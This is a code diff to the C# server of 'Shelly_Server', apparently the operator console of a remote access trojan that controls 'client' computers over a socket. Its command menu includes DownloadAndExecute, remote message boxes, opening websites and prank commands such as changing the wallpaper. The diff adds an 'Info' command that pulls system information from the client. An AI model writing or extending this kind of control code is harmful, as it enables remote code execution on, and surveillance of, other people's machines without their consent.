@@ -27,7 +27,8 @@ namespace Shelly_Server
                         "3. Ping - Pings the client and shows the response\n" + 
                         "4. MessageBox - Shows a messagebox on the clients computer\n" +
                         "5. DownloadAndExecute - Downloads and executes a file\n" +
-                        "6. OpenWebsite - Opens a website using the IE browser\n\n" +
+                        "6. OpenWebsite - Opens a website using the IE browser\n" +
+                        "7. Info - Shows client system information\n\n" +
 
                         "FUN\n" +
                         "1. ChangeWallpaper - Changes client desktop wallpaper\n" +
@@ -103,6 +104,16 @@ namespace Shelly_Server
 
                     // Send message
                     SocketHandler.Send(CommandPS + Functions.UserInput.GetLinkInput(3));
+                    break;
+
+                // Get client info
+                case "info":
+
+                    // Send message
+                    SocketHandler.Send(Command);
+
+                    // Get response
+                    Console.WriteLine(SocketHandler.Receive());
                     break;
 
                 // Change wallpaper
